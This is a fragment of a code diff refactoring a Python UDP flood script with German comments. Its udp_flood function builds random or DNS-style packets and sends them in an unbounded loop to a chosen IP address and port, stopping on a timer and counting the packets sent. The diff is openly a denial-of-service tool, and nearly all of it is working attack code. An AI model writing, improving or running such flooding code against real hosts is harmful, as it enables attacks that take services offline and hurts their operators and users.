@@ -10,17 +10,7 @@ def udp_flood(ip, port, packet_size, protocol="generic"):
     global packet_counter
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-def udp_flood(ip, port, packet_size):
-    global packet_counter
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    udp_bytes = random._urandom(packet_size)
-    while not stop_event.is_set():
-        try:
-            sock.sendto(udp_bytes, (ip, port))
-            packet_counter += 1
-        except:
-            pass
-    
+    # Wähle das richtige Paket basierend auf dem Protokoll
     if protocol == "generic":
         udp_bytes = random._urandom(packet_size)
     elif protocol == "dns":
@@ -35,12 +25,15 @@ def udp_flood(ip, port, packet_size):
         print(f"Unbekanntes Protokoll: {protocol}")
         return
 
-    while not stop_event.is_set():
-        try:
+    # Sende UDP-Pakete in einer Schleife
+    try:
+        while not stop_event.is_set():
             sock.sendto(udp_bytes, (ip, port))
             packet_counter += 1
-        except:
-            pass
+    except Exception as e:
+        print(f"Fehler beim Senden: {e}")
+    finally:
+        sock.close()  # Ressource freigeben
 
 def build_dns_packet():
     """Erstellt ein DNS-Abfragepaket."""
@@ -91,6 +84,8 @@ try:
     # Stoppe den Flood nach 10 Sekunden
     threading.Timer(10, stop_event.set).start()
     flood_thread.join()
+
+    print(f"Anzahl gesendeter Pakete: {packet_counter}")
 except KeyboardInterrupt:
     stop_event.set()
     print("Flood gestoppt.")
